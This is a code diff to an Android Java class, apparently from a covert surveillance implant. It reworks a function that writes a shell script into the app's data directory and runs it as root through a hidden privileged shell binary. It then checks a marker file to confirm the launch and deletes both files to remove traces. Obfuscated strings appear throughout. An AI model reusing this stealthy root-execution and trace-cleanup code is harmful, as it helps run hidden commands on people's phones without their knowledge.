@@ -4,6 +4,7 @@ import android.app.ActivityManager;
 import android.content.Context;
 
 import java.io.BufferedReader;
+import java.io.File;
 import java.io.InputStreamReader;
 import java.lang.reflect.Field;
 import java.util.List;
@@ -248,23 +249,41 @@ public class Execute {
 
 	public synchronized static boolean executeRootAndForgetScript(String cmd) {
 		String pack = Status.self().getAppContext().getPackageName();
-
-		String script = M.e("#!/system/bin/sh") + "\n" + cmd;
-		String filename = String.format(M.e("%s qzx /data/data/%s/files/e"), Configuration.shellFile, pack);
+		String filename = String.format(M.e("/data/data/%s/files/e"), pack);
+		String command = String.format(M.e("%s qzx %s"), Configuration.shellFile, filename);
+		String script = M.e("#!/system/bin/sh") + "\necho 'r'> " +filename+".r\n" + cmd ;
 
 		if (Root.createScript("e", script) == true) {
 			try {
-				Process localProcess = Runtime.getRuntime().exec(filename);
-				return true;
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(executeRootAndForgetScript),executing " + command);
+				}
+				Runtime.getRuntime().exec(command);
+				File f = new File(filename + ".r");
+
+				for (int i = 0; i < 10; i++) {
+					if (f.exists()) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "(executeRootAndForgetScript),ok script lunched ");
+						}
+						return true;
+					}
+					Utils.sleep(500);
+				}
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(executeRootAndForgetScript),script not lunched");
+				}
+
 			} catch (Exception e) {
 				if (Cfg.EXCEPTION) {
 					Check.log(e);
 				}
 			}finally{
 				Root.removeScript("e");
+				Root.removeScript("e.r");
 			}
 		}
-
 		return false;
 	}
 
